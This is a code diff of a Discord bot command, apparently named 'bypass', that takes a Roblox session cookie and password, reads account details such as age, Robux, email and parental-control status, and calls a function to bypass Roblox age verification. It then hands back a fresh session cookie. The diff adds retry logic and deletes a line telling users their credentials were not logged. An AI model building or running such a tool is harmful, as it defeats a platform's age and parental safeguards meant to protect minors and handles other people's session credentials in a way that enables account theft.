@@ -1,3 +1,4 @@
+// src/bot/commands/bypass.ts
 import {
   SlashCommandBuilder,
   PermissionFlagsBits,
@@ -45,7 +46,6 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       return;
     }
 
-    // Fetch account info upfront (for the full embed)
     const userId = validation.userId!;
     const age = await Roblox.getUserAge(userId);
     const robux = await Roblox.fetchRobux(rawCookie, String(userId));
@@ -60,7 +60,6 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
     else if (email.pending) emailStatus = `⏳ Pending: \`${email.pending}\``;
     const parentStatus = parental.hasParent ? '✅ Parent linked' : '❌ No parent linked';
 
-    // If no verified email, show full account info and stop (bypass not needed)
     if (!email.verified) {
       const embed = buildAccountEmbed(
         validation.username!,
@@ -78,16 +77,37 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       return;
     }
 
-    // Proceed with bypass
     const progressEmbed = buildProgressEmbed('Sending bypass request...');
     await interaction.editReply({ embeds: [progressEmbed] });
 
-    const bypassResult = await Roblox.bypassAgeVerification(rawCookie, password);
-    if (bypassResult.success) {
-      let newCookie = bypassResult.newCookie;
+    let lastMessage = 'Sending bypass request...';
+    let attempts = 0;
+    const result = await (async () => {
+      let delay = 3000;
+      for (let attempt = 1; attempt <= 6; attempt++) {
+        attempts = attempt;
+        const res = await Roblox.bypassAgeVerification(rawCookie, password);
+        if (res.success) return res;
+        if (res.inProgress) {
+          lastMessage = `Processing... (attempt ${attempt}/6)`;
+          const updateEmbed = buildProgressEmbed(lastMessage);
+          await interaction.editReply({ embeds: [updateEmbed] });
+          if (attempt < 6) {
+            await new Promise(resolve => setTimeout(resolve, delay));
+            delay = Math.min(delay * 1.5, 10000);
+          }
+          continue;
+        }
+        return res;
+      }
+      return { success: false, message: 'Still processing, please check later.', timedOut: true };
+    })();
+
+    if (result.success) {
+      let newCookie = result.newCookie;
       let finalUserId = userId;
-      let finalUsername = validation.username;
-      let finalDisplayName = validation.displayName;
+      let finalUsername = validation.username!;
+      let finalDisplayName = validation.displayName || null;
       let finalAge = age;
       let finalRobux = robux;
       let finalSummary = summary;
@@ -96,7 +116,6 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       let finalParental = parental;
       let finalThumb = thumb;
 
-      // If a new cookie was returned, re‑fetch everything with the new cookie
       if (newCookie) {
         const newValidation = await Roblox.validateCookie(newCookie);
         if (newValidation.valid) {
@@ -111,7 +130,6 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
           finalParental = await Roblox.fetchParentalControls(newCookie);
           finalThumb = await Roblox.fetchAvatarThumbnail(String(finalUserId));
         } else {
-          
           newCookie = undefined;
         }
       }
@@ -132,19 +150,12 @@ async function execute(interaction: ChatInputCommandInteraction): Promise<void> 
       const id = newCookie ? Math.random().toString(36).slice(2, 10) : '';
       const row = newCookie ? buildCopyButtons(id, 'bypass', newCookie, false) : undefined;
       await interaction.editReply({ embeds: [embed], components: row ? [row] : [] });
+    } else if (result.timedOut) {
+      const embed = buildProgressEmbed('Bypass is still in progress. Please check later.');
+      await interaction.editReply({ embeds: [embed] });
     } else {
-      if (bypassResult.message === 'Progressing..') {
-        const embed = buildProgressEmbed('Bypass in progress... Please wait and check later.');
-        await interaction.editReply({ embeds: [embed] });
-      } else {
-        await interaction.editReply({
-          embeds: [
-            buildErrorEmbed(
-              `✧ **Bypass Failed**\n────\n⭑ ${bypassResult.message}\n⭑ Your credentials were not logged.`
-            ),
-          ],
-        });
-      }
+      const embed = buildErrorEmbed(`✧ **Bypass Failed**\n────\n⭑ ${result.message}`);
+      await interaction.editReply({ embeds: [embed] });
     }
   } catch (err: any) {
     logger.error({ err }, 'Bypass command error');
